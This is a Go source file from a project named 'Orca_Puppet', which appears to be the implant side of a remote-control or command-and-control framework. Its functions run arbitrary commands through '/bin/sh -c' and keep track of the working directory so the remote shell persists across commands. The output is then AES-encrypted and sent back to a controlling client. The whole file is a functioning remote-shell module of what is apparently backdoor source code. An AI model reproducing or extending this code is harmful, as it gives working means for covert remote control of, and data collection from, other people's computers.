package shellopt

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
)

func Cmd(command string) (out string, err error) {
	cmd := exec.Command("/bin/sh", "-c", command)
	o, err := cmd.CombinedOutput()
	cmdRe := util.ConvertByte2String(o, "GB18030")
	out = fmt.Sprintf(cmdRe)
	return out, err
}

func ExecCmd(command string) string {
	u, _ := user.Current()
	pwd, _ := os.Getwd()
	command = strings.TrimSpace(command)
	var resBuffer = ""
	// 命令长度小于2时，直接返回错误
	if len(command) < 2 {
		outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, "command execution error")
		return outputMsg
	}
	if strings.EqualFold(command[:2], "cd") {
		var absPath string
		var err error
		if len(command) == 2 {
			command += " " + u.HomeDir
		}
		if !filepath.IsAbs(command[3:]) {
			absPath, err = filepath.Abs(filepath.Join(pwd, command[3:]))
			command = command[:2] + " " + absPath
			if err != nil {
				outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, "command execution error")
				return outputMsg
			}
		} else {
			absPath = command[3:]
		}
		err = os.Chdir(absPath)
		if err != nil {
			outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, "command execution error")
			return outputMsg
		}
	}
	output, err := Cmd(command)
	if err != nil {
		outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, "command execution error")
		return outputMsg
	} else {
		dir, _ := os.Getwd()
		if len(output) > 0 {
			resBuffer = dir + ">\n" + output
		} else {
			resBuffer = dir + ">\n" + colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "command execute but there is no answer")
		}
	}
	return resBuffer
}

func RetExecOutput(resBuffer, clientId string) {
	encResBuffer, err := crypto.Encrypt([]byte(resBuffer), []byte(config.AesKey))
	if err != nil {
		return
	}
	common.SendSuccessMsg(clientId, common.ClientId, "execShell_ret", encResBuffer)
}
